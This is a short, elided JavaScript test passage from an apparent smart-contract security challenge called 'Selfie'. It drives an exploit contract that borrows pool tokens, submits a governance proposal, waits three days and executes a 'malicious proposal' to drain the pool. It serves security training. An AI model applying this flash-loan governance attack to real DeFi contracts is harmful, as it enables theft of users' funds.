...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    selfieExploit = await SelfieExploit.new(
      this.pool.address,
      this.governance.address,
      this.token.address,
      attacker,
    ...
    const flashpoolBalanceBefore = await this.token.balanceOf(
      this.pool.address
    );
    console.log(`flashpoolBalanceBefore: ${flashpoolBalanceBefore.toString()}`);
    await selfieExploit.borrowAndPropose();
    await time.increase(time.duration.days(3));
    await selfieExploit.executeMaliciousProposal();
  });
